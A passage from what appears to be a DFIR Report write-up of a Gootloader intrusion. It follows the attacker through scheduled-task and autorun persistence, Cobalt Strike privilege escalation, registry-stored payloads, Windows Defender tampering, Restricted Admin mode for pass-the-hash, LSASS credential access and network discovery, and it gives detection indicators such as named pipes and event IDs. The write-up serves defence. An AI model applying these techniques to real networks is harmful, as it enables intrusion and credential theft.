<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28341" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-022.png" alt="" width="2180" height="1462" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-022.png 2180w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-022-300x201.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-022-1024x687.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-022-768x515.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-022-1536x1030.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-022-2048x1373.png 2048w" sizes="(max-width: 2180px) 100vw, 2180px" /></a></p>





<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>



<p><strong>Gootloader</strong></p>



<p>A scheduled task was created during the initial Gootloader execution. This task was run on demand to execute the next stage in the Gootloader malware chain, and setup a Logon Trigger to maintain persistence on the beachhead.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28342" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-023.png" alt="" width="1396" height="1706" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-023.png 1396w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-023-245x300.png 245w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-023-838x1024.png 838w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-023-768x939.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-023-1257x1536.png 1257w" sizes="(max-width: 1396px) 100vw, 1396px" /></a></p>





<p><strong>SystemBC</strong></p>



<p>Later in the intrusion the threat actor deployed a SystemBC PowerShell script. They setup persistence for this script by using an autorun key named &#8216;socks_powershell&#8217;</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28343" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-024.png" alt="" width="900" height="52" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-024.png 900w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-024-300x17.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-024-768x44.png 768w" sizes="(max-width: 900px) 100vw, 900px" /></a></p>



<h2 id="privilege-escalation" class="wp-block-heading"><a href="#privilege-escalation">Privilege Escalation</a></h2>



<p>The use of the Cobalt Strike &#8216;getsystem&#8217; command was evident, with cmd being spawned from the beacon (DLLHOST) to elevate to a &#8216;SYSTEM&#8217; context.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28344" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-025.png" alt="" width="892" height="79" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-025.png 892w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-025-300x27.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-025-768x68.png 768w" sizes="(max-width: 892px) 100vw, 892px" /></a></p>





<p>Details of the technique are documented here: <a href="https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem" target="_blank" rel="noreferrer noopener">https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem</a></p>



<p>Throughout the intrusion, new logon sessions were initiated using tokens created from harvested credentials. Initially, a sacrificial process, dllhost.exe, was launched from the PowerShell payload using the credentials of the compromised beachhead account.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28345" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-026.png" alt="" width="862" height="303" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-026.png 862w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-026-300x105.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-026-768x270.png 768w" sizes="(max-width: 862px) 100vw, 862px" /></a></p>





<p>Using a harvested credential, a new logon session was created. This was logged under Windows eventID 4624, showing the initial Logon ID, and followed the new Logon ID using the target user account.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28346" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-027.png" alt="" width="656" height="881" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-027.png 656w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-027-223x300.png 223w" sizes="(max-width: 656px) 100vw, 656px" /></a></p>





<p>The newly created logon session (Logon ID) was assigned special privileges (elevated) as detailed in eventID 4672.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28347" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-028.png" alt="" width="707" height="710" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-028.png 707w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-028-300x300.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-028-150x150.png 150w" sizes="(max-width: 707px) 100vw, 707px" /></a></p>





<p>Resulting in the CMD with the new logon session with elevated privileges</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28348" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-029.png" alt="" width="677" height="635" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-029.png 677w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-029-300x281.png 300w" sizes="(max-width: 677px) 100vw, 677px" /></a></p>





<p>The threat actor targeted several accounts using the same technique, these were:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28349" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-030.png" alt="" width="1247" height="356" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-030.png 1247w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-030-300x86.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-030-1024x292.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-030-768x219.png 768w" sizes="(max-width: 1247px) 100vw, 1247px" /></a></p>





<p>The threat actor pivoted across compromised accounts and across several endpoints with relative ease.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28350" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-031.png" alt="" width="533" height="336" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-031.png 533w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-031-300x189.png 300w" sizes="(max-width: 533px) 100vw, 533px" /></a></figure>



<p>Multiple detection opportunities exist, including correlating atypical logons to high-privilege accounts from unexpected accounts or workstations, and the assignment of special privileges to a logon ID by standard users. The use of &#8216;Logon type 9&#8217; alongside an authentication type of &#8216;seclogo&#8217; strongly indicates credential use, akin to the &#8216;runas&#8217; command&#8217;s /netonly method, as used by Cobalt Strike&#8217;s &#8216;pass the hash&#8217; technique. (<a href="https://www.cobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials" target="_blank" rel="noreferrer noopener">https://www.cobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials</a>).</p>



<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>



<p>On the beachhead host, to avoid dropping files to disk, several registry keys were created to store the payloads under:</p>
<pre>HCKU\Software\Microsoft\Personalization</pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28351" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-032.png" alt="" width="164" height="95" /></a></p>





<p>Each key has an associated payload (stage 1 and 2). These keys stored the data for the Cobalt Strike beacon executed on the beachhead.</p>



<p><strong>geRBAdXTDCkN</strong></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28352" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-033.png" alt="" width="778" height="146" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-033.png 778w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-033-300x56.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-033-768x144.png 768w" sizes="(max-width: 778px) 100vw, 778px" /></a></p>





<p><strong>cbkSBtbjQBNFy</strong></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28353" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-034.png" alt="" width="778" height="241" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-034.png 778w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-034-300x93.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-034-768x238.png 768w" sizes="(max-width: 778px) 100vw, 778px" /></a></p>





<p>Execution of the payload to run the Cobalt Strike beacon can be observed by base64 encoded PowerShell commands</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28354" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-035.png" alt="" width="950" height="161" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-035.png 950w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-035-300x51.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-035-768x130.png 768w" sizes="(max-width: 950px) 100vw, 950px" /></a></p>





<p>During the intrusion we observed activity related to Windows Defender tampering. This command was executed remotely on the hosts using Cobalt Strike modules such as psexec_psh. Scheduled scanning tasks were deleted, and a service was created to disable real-time monitoring.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28355" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-036.png" alt="" width="597" height="183" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-036.png 597w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-036-300x92.png 300w" sizes="(max-width: 597px) 100vw, 597px" /></a></p>





<p><strong>Scheduled task commands</strong></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28356" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-037.png" alt="" width="910" height="232" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-037.png 910w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-037-300x76.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-037-768x196.png 768w" sizes="(max-width: 910px) 100vw, 910px" /></a></p>





<h4 class="wp-block-heading"><strong>Remote Desktop</strong></h4>



<p>Restricted Admin Mode was enabled by modifying the DisableRestrictedAdmin key to 0</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28357" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-038.png" alt="" width="793" height="28" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-038.png 793w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-038-300x11.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-038-768x27.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-038-765x28.png 765w" sizes="(max-width: 793px) 100vw, 793px" /></a></p>





<p>Enabling Restricted Admin Mode allows the attacker to use collected hashes to login instead of a password. An explanation can be found here [<a href="https://github.com/GhostPack/RestrictedAdmin" target="_blank" rel="noreferrer noopener">https://github.com/GhostPack/RestrictedAdmin</a>]. The same technique was observed by <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a" target="_blank" rel="noreferrer noopener">SVR</a> and various <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a" target="_blank" rel="noreferrer noopener">other</a> threat actors.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28359" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-039.png" alt="" width="610" height="106" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-039.png 610w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-039-300x52.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></a></p>





<p>The same technique was also observed in a previous <a href="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/" target="_blank" rel="noreferrer noopener">Gootloader case</a> as well as two other public <a href="https://thedfirreport.com/?s=%22Restricted+Admin+Mode%22" target="_blank" rel="noreferrer noopener">cases</a>.</p>



<p>The second registry modification allowed RDP connections by changing the &#8216;DenyTSConnections&#8217; setting.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28360" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-040.png" alt="" width="855" height="22" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-040.png 855w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-040-300x8.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-040-768x20.png 768w" sizes="(max-width: 855px) 100vw, 855px" /></a></p>





<p class="wp-block-heading"><strong>Windows Firewall</strong></p>



<p>On the domain controller, &#8216;Netsh&#8217; was used to enable the remote desktop firewall profile</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28361" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-041.png" alt="" width="446" height="24" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-041.png 446w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-041-300x16.png 300w" sizes="(max-width: 446px) 100vw, 446px" /></a></p>





<p>followed by the remote admin firewall profile</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28362" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-042.png" alt="" width="428" height="26" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-042.png 428w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-042-300x18.png 300w" sizes="(max-width: 428px) 100vw, 428px" /></a></p>





<p><strong>Process Injection</strong></p>



<p>We observed process injection activity, with PowerShell and dllhost being utilized to load Cobalt Strike beacons into the memory on the beachhead host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28363" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-043.png" alt="" width="2032" height="454" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-043.png 2032w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-043-300x67.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-043-1024x229.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-043-768x172.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-043-1536x343.png 1536w" sizes="(max-width: 2032px) 100vw, 2032px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28364" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-044.png" alt="" width="2190" height="566" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-044.png 2190w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-044-300x78.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-044-1024x265.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-044-768x198.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-044-1536x397.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-044-2048x529.png 2048w" sizes="(max-width: 2190px) 100vw, 2190px" /></a></p>







<p>This can be observed in the memory dump from the beachhead host with the tell-tale PAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers observable in the process memory space.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28366" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-045.png" alt="" width="2052" height="524" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-045.png 2052w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-045-300x77.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-045-1024x261.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-045-768x196.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-045-1536x392.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-045-2048x523.png 2048w" sizes="(max-width: 2052px) 100vw, 2052px" /></a></p>





<p>During the intrusion, we observed multiple named pipes utilized by the threat actor&#8217;s Cobalt Strike injected beacons via PowerShell and dllhost:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28367" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-046.png" alt="" width="648" height="464" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-046.png 648w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-046-300x215.png 300w" sizes="(max-width: 648px) 100vw, 648px" /></a></p>





<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28368" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-047.png" alt="" width="648" height="464" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-047.png 648w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-047-300x215.png 300w" sizes="(max-width: 648px) 100vw, 648px" /></a></p>



<pre>PipeName: \4fcc39 <br />PipeName: \netsvc\1324</pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28369" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-048.png" alt="" width="696" height="376" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-048.png 696w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-048-300x162.png 300w" sizes="(max-width: 696px) 100vw, 696px" /></a></p>





<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28370" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-049.png" alt="" width="696" height="376" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-049.png 696w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-049-300x162.png 300w" sizes="(max-width: 696px) 100vw, 696px" /></a></figure>



<pre>PipeName: \4fcc39 <br />PipeName: \netsvc\415</pre>



<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>



<p>Across the compromised endpoints where a Cobalt Strike beacon was deployed, the LSASS process was accessed to retrieve in memory credentials.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28371" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-050.png" alt="" width="1128" height="128" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-050.png 1128w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-050-300x34.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-050-1024x116.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-050-768x87.png 768w" sizes="(max-width: 1128px) 100vw, 1128px" /></a></p>





<p>Suspicious CallTrace with &#8216;UNKNOWN&#8217; indicates injected code, whilst the Granted Access 0x1010 is a standard behavior from credential stealing tools such as mimikatz. The code 0x1010 can be broken down to the below access rights:</p>



<ul class="wp-block-list">
<li>0x00000010 = VMRead</li>



<li>0x00001000 = QueryLimitedInfo</li>
</ul>



<p>The operator spent some time accessing and viewing files. File that were of the most interest were those that could indicate credentials storage. In this intrusion &#8216;Notepad&#8217; was used to view a file within a Passwords file share location.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28372" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-051.png" alt="" width="675" height="27" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-051.png 675w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-051-300x12.png 300w" sizes="(max-width: 675px) 100vw, 675px" /></a></p>





<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>



<p><strong>Gootloader</strong></p>



<p>Before hands on keyboard activity, Gootloader ran a number of PowerShell Cmdlets to collect basic host information.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28374" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-052.png" alt="" width="662" height="462" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-052.png 662w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-052-300x209.png 300w" sizes="(max-width: 662px) 100vw, 662px" /></a></p>





<p>The first section collected environmental data from the host using env:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-096.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28380" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-096.png" alt="" width="1396" height="146" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-096.png 1396w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-096-300x31.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-096-1024x107.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-096-768x80.png 768w" sizes="(max-width: 1396px) 100vw, 1396px" /></a></p>
<p>&nbsp;</p>





<p>Next the host operating system using Get-WmiObject:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-053-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28379" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-053-1.png" alt="" width="1384" height="143" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-053-1.png 1384w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-053-1-300x31.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-053-1-1024x106.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-053-1-768x79.png 768w" sizes="(max-width: 1384px) 100vw, 1384px" /></a></p>
<p>&nbsp;</p>





<p>Followed by running processes with a filter for maintitlewindow using Get-Process.</p>



<p>No filter:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-054.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28376" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-054.png" alt="" width="1380" height="212" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-054.png 1380w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-054-300x46.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-054-1024x157.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-054-768x118.png 768w" sizes="(max-width: 1380px) 100vw, 1380px" /></a></p>
<p>&nbsp;</p>





<p>With filter:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-055.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28377" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-055.png" alt="" width="1382" height="209" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-055.png 1382w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-055-300x45.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-055-1024x155.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-055-768x116.png 768w" sizes="(max-width: 1382px) 100vw, 1382px" /></a></p>





<p>And a disk space check using Get-PsDrive:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28381" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-056.png" alt="" width="1092" height="465" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-056.png 1092w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-056-300x128.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-056-1024x436.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-056-768x327.png 768w" sizes="(max-width: 1092px) 100vw, 1092px" /></a></p>





<p class="wp-block-heading"><strong>RDP Port Discovery</strong></p>



<p>Advanced IP Scanner (<a href="https://www.advanced-ip-scanner.com/" target="_blank" rel="noreferrer noopener">https://www.advanced-ip-scanner.com/</a>) was executed from a compromised account and then used to look for systems with RDP (3389) open.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-057.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28382" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-057.png" alt="" width="2720" height="1482" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-057.png 2720w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-057-300x163.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-057-1024x558.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-057-768x418.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-057-1536x837.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-057-2048x1116.png 2048w" sizes="(max-width: 2720px) 100vw, 2720px" /></a></p>





<p class="wp-block-heading"><strong>LDAP</strong></p>



<p>The DLLHost process (Cobalt Strike beacon) undertook several LDAP (Lightweight Directory Access Protocol) queries using port 389 and 3268. </p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28383" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-058.png" alt="" width="2176" height="1552" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-058.png 2176w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-058-300x214.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-058-1024x730.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-058-768x548.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-058-1536x1096.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-058-2048x1461.png 2048w" sizes="(max-width: 2176px) 100vw, 2176px" /></a></p>





<p class="wp-block-heading"><strong>Shares Enumeration</strong></p>



<p>Scanning all the network endpoints for the presence of shared folders was undertaken. This is a common technique we&#8217;ve observed in other similar cases to discover and collect information of interest, i.e., credentials and confidential information.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-059.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28384" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-059.png" alt="" width="1760" height="1544" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-059.png 1760w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-059-300x263.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-059-1024x898.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-059-768x674.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-059-1536x1347.png 1536w" sizes="(max-width: 1760px) 100vw, 1760px" /></a></p>





<p class="wp-block-heading"><strong>Ping</strong></p>



<p>The DLLHost (Cobalt Strike beacon) conducted several ping sweeps across endpoints using the &#8216;ping&#8217; command:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-060.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28385" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-060.png" alt="" width="519" height="159" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-060.png 519w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-060-300x92.png 300w" sizes="(max-width: 519px) 100vw, 519px" /></a></p>





<p>The use of the ping command had several unusual indicators. The command was executed from a SYSTEM account, and a conhost process was created with no attached console session [<a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-wtsgetactiveconsolesessionid#return-value" target="_blank" rel="noreferrer noopener">https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-wtsgetactiveconsolesessionid#return-value</a>]</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-061.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28386" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-061.png" alt="" width="590" height="389" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-061.png 590w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-061-300x198.png 300w" sizes="(max-width: 590px) 100vw, 590px" /></a></p>





<p>Multiple executions of &#8216;ping&#8217; using these indicators:</p>
